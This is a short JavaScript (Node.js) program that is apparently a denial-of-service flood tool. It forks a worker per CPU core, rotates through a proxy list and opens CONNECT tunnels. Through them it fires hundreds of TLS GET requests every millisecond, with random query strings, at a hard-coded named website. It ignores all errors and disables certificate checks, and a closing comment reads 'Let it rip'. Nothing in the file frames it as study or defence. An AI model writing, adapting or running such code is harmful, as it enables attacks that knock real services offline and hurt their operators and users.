const fs = require('fs');
const net = require('net');
const tls = require('tls');
const { randomBytes } = require('crypto');
const { cpus } = require('os');
const cluster = require('cluster');

const TARGET_HOST = 'https://empire.zexcloud.one';
const TARGET_PORT = 443;
const TARGET_PATH = '/?id=';
const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const INTERVAL = 5000;
const CORES = cpus().length;

if (cluster.isMaster) {
  for (let i = 0; i < CORES; i++) cluster.fork();
} else {
  let count = 0;
  let proxyIndex = 0;

  setInterval(() => {
    console.log(`(${count}) requests sent to (${TARGET_HOST}) in 5 seconds`);
    count = 0;
  }, INTERVAL);

  setInterval(() => {
    proxyIndex = (proxyIndex + 1) % PROXIES.length;
  }, INTERVAL);

  function fire() {
    const [proxyHost, proxyPort] = PROXIES[proxyIndex].split(':');

    try {
      const socket = net.connect(proxyPort, proxyHost, () => {
        socket.write(`CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\nHost: ${TARGET_HOST}\r\n\r\n`);
        
        // Send TLS immediately without waiting for CONNECT response
        const tlsSocket = tls.connect({
          socket,
          servername: TARGET_HOST,
          rejectUnauthorized: false,
          secureContext: tls.createSecureContext()
        }, () => {
          const req = 
            `GET ${TARGET_PATH + randomBytes(8).toString('hex')} HTTP/1.1\r\n` +
            `Host: ${TARGET_HOST}\r\n` +
            `User-Agent: NoChill/1.0\r\n` +
            `Accept: */*\r\n` +
            `Connection: close\r\n\r\n`;
          tlsSocket.write(req);
          tlsSocket.end();
        });

        tlsSocket.on('error', () => {});
      });

      socket.on('error', () => {});
      socket.setTimeout(1000, () => socket.destroy());

      count++;
    } catch (e) {}
  }

  // Let it rip
  setInterval(() => {
    for (let i = 0; i < 500; i++) fire();  // Adjust as needed
  }, 1);
}
